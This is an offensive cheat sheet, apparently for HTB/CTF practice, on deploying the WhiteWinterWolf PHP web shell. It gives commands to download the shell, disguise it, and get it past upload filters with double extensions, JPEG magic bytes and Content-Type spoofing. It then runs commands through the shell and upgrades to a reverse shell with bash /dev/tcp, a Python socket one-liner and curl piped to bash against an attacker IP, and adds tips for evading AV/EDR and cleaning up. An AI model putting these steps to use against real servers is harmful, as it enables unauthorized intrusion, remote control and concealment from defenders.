# WhiteWinterWolf PHP Webshell

**Tags:** `#wwolfphp` `#webshells` `#php` `#payloads`

Clean, single-file PHP web shell with a browser-based UI. Provides command execution, file browser, file read/write, and download. Commonly used in HTB/CTF when a PHP file upload vector is available. Lightweight and well-featured compared to basic `<?php system($_GET['cmd']); ?>` shells.

**Source:** https://github.com/WhiteWinterWolf/wwwolf-php-webshell
**Install:** `wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php`

```bash
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php
```

> [!note]
> No IP restriction by default — anyone who finds the URL can use it. Add an IP check if operating on a shared network. The shell is a known signature; rename the file and/or modify it slightly to avoid AV/WAF detection.

---

## Setup & Upload

```bash
# Download
wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php

# Rename to blend in
cp webshell.php image.php
cp webshell.php config.php

# Optional: bypass extension filters — try double extensions
# shell.php.jpg, shell.phtml, shell.php5, shell.pHp

# Upload via file upload vulnerability, then browse to:
http://target/uploads/image.php
```

---

## Bypassing Upload Filters

```bash
# Rename extensions to bypass blacklist
mv webshell.php shell.phtml
mv webshell.php shell.php5
mv webshell.php shell.php7
mv webshell.php shell.pHp      # case variation

# Add magic bytes for image bypass (prepend JPEG header)
printf '\xff\xd8\xff' | cat - webshell.php > shell.php.jpg

# Modify Content-Type in Burp during upload:
# Content-Type: image/jpeg
```

---

## Usage

Browse to the uploaded file — the shell provides:
- **Command field** — run OS commands
- **File browser** — navigate the filesystem
- **File viewer** — read files
- **Upload** — push additional files to the server

Quick commands via URL parameter (useful for automation):
```
http://target/uploads/shell.php?cmd=id
http://target/uploads/shell.php?cmd=whoami
```

> [!tip]
> Use the shell to upload a more capable payload (netcat, meterpreter) or execute a reverse shell one-liner.

---

## Upgrade to Reverse Shell

From the web shell command box:
```bash
# Bash reverse shell
bash -c 'bash -i >& /dev/tcp/10.10.14.5/443 0>&1'

# Python reverse shell (if bash fails)
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# curl + execute
curl http://10.10.14.5:8000/shell.sh | bash
```

Kali listener:
```bash
nc -lvnp 443
```

---

## OPSEC

- Web shell written to disk — detectable by FIM and AV/EDR
- The file is a well-known signature — AV may flag on upload or execution
- Rename the file and change function/variable names for evasion
- Remove after use: from web shell run `unlink(__FILE__);` or `rm /path/to/shell.php`

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
